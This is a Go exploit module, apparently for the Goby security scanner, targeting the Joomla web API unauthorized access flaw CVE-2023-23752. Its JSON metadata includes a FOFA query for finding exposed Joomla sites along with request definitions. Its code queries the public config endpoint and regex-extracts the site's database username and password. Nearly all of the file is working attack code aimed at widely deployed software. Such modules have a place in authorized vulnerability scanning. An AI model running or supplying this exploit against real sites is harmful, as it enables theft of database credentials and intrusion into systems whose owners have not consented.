package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Joomla Web Api Interface Unauthorized Access Vulnerability (CVE-2023-23752)",
    "Description": "<p>Joomla is a free and open-source content management system (CMS) for publishing web content.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "Joomla",
    "Homepage": "http://www.Joomla.org/",
    "DisclosureDate": "2023-02-17",
    "Author": "afei_00123@foxmail.com",
    "FofaQuery": "((body=\"content=\\\"Joomla\" && (body=\"name=\\\"generator\\\" content=\\\"Joomla\" || body=\"name=\\\"author\\\" content=\\\"Joomla\" || body=\"name=\\\"keywords\\\" content=\\\"joomla\" || body=\"Joomla! - Open Source Content Management\" || body=\"Joomla! 1.5 - Open Source Content Management\"))) && body!=\"couchdb\" && body!=\"whmcscontainer\" && title!=\"Waiting for the redirectiron...\" && body!=\"name=\\\"generator\\\" content=\\\"WordPress\" && header!=\"wp-json\" && header!=\"WordPress\" && body!=\"<title>Posibolt ERP</title>\" && body!=\"content=\\\"JIRA\"",
    "GobyQuery": "((body=\"content=\\\"Joomla\" && (body=\"name=\\\"generator\\\" content=\\\"Joomla\" || body=\"name=\\\"author\\\" content=\\\"Joomla\" || body=\"name=\\\"keywords\\\" content=\\\"joomla\" || body=\"Joomla! - Open Source Content Management\" || body=\"Joomla! 1.5 - Open Source Content Management\"))) && body!=\"couchdb\" && body!=\"whmcscontainer\" && title!=\"Waiting for the redirectiron...\" && body!=\"name=\\\"generator\\\" content=\\\"WordPress\" && header!=\"wp-json\" && header!=\"WordPress\" && body!=\"<title>Posibolt ERP</title>\" && body!=\"content=\\\"JIRA\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.Joomla.org/\">http://www.Joomla.org/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "showImportant,showAll",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=2000",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "links",
                        "bz": "未授权访问特征判断"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"attributes\":",
                        "bz": "未授权访问特征判断"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user",
                        "bz": "敏感信息判断"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": "敏感信息判断"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/api/index.php/v1/config/application?public=true",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "links",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"attributes\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=2000",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "links",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"attributes\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/api/index.php/v1/config/application?public=true",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Accept": "*/*",
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "links",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"attributes\":",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "user",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "Unauthorized Access"
    ],
    "VulType": [
        "Information Disclosure",
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2023-23752"
    ],
    "CNNVD": [
        "CNNVD-202302-1375"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "Joomla Web Api 接口未授权访问漏洞（CVE-2023-23752）",
            "Product": "Joomla",
            "Description": "<p>Joomla是一个免费开源的内容管理系统(CMS)，用于发布 Web 内容。</p><p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.Joomla.org/\">http://www.Joomla.org/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "信息泄露",
                "未授权访问"
            ],
            "Tags": [
                "信息泄露",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Joomla Web Api Interface Unauthorized Access Vulnerability (CVE-2023-23752)",
            "Product": "Joomla",
            "Description": "<p>Joomla is a free and open-source content management system (CMS) for publishing web content.<br></p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"http://www.Joomla.org/\">http://www.Joomla.org/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Information Disclosure",
                "Unauthorized Access"
            ],
            "Tags": [
                "Information Disclosure",
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-11",
    "PocId": "10765"
}`

	sendRequestAndCheckResponse456S1DFH := func(hostInfo *httpclient.FixUrl, url string) string {
		cfg := httpclient.NewGetRequestConfig(url)
		cfg.Header.Store("Connection", "close")
		cfg.Header.Store("Accept", "*/*")
		cfg.Header.Store("Accept-Language", "en")
		cfg.Header.Store("Accept-Encoding", "gzip, deflate")
		cfg.VerifyTls = false
		cfg.FollowRedirect = true
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "links") &&
			strings.Contains(resp.RawBody, "\"attributes\"") &&
			strings.Contains(resp.RawBody, "user") &&
			strings.Contains(resp.RawBody, "password") {
			return resp.Utf8Html
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			url1 := "/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=2000"
			url2 := "/api/index.php/v1/config/application?public=true"
			htmlBody := sendRequestAndCheckResponse456S1DFH(hostInfo, url1)
			if len(htmlBody) > 0 {
				return true
			}
			htmlBody = sendRequestAndCheckResponse456S1DFH(hostInfo, url2)
			return len(htmlBody) > 0
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			uri1 := "/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=2000"
			uri2 := "/api/index.php/v1/config/application?public=true"
			uris := []string{uri1, uri2}
			htmlBody := ""
			for _, uri := range uris {
				htmlBody = sendRequestAndCheckResponse456S1DFH(expResult.HostInfo, uri)
				if len(htmlBody) > 0 {
					break
				}
			}
			if attackType == "showAll" {
				expResult.Success = true
				expResult.Output = htmlBody
				return expResult
			} else if attackType == "showImportant" {
				reForUser := regexp.MustCompile(`"user":"([^"]+)"`)
				matchForUser := reForUser.FindStringSubmatch(htmlBody)
				reForPassword := regexp.MustCompile(`"password":"([^"]+)"`)
				matchForPassword := reForPassword.FindStringSubmatch(htmlBody)
				if len(matchForUser) > 1 && len(matchForPassword) > 1 {
					expResult.Success = true
					expResult.Output += "\nuser: " + matchForUser[1] + "\n"
					expResult.Output += "password: " + matchForPassword[1] + "\n"
				}
			}
			return expResult
		},
	))
}
